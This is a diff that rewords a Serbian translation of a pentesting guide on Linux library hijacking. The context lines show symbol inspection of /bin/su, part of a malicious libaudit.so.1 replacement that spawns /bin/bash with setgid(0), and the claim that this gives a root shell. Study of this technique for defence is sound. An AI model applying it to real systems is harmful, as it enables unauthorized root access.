@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Simboli `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` i `audit_fd` verovatno potiču iz biblioteke libaudit.so.1. Pošto će libaudit.so.1 biti prepisana zloćudnom deljenom bibliotekom, ovi simboli bi trebali biti prisutni u novoj deljenoj biblioteci, inače program neće moći da pronađe simbol i izaći će.
+Simboli `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` i `audit_fd` verovatno potiču iz biblioteke libaudit.so.1. Pošto će libaudit.so.1 biti prepisana zlonamernom deljenom bibliotekom, ovi simboli bi trebali biti prisutni u novoj deljenoj biblioteci, inače program neće moći da pronađe simbol i izaći će.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,7 +98,7 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Sada, samo pozivajući **`/bin/su`** dobićete shell kao root.
+Sada, jednostavno pozivajući **`/bin/su`** dobićete shell kao root.
 
 ## Skripte
 
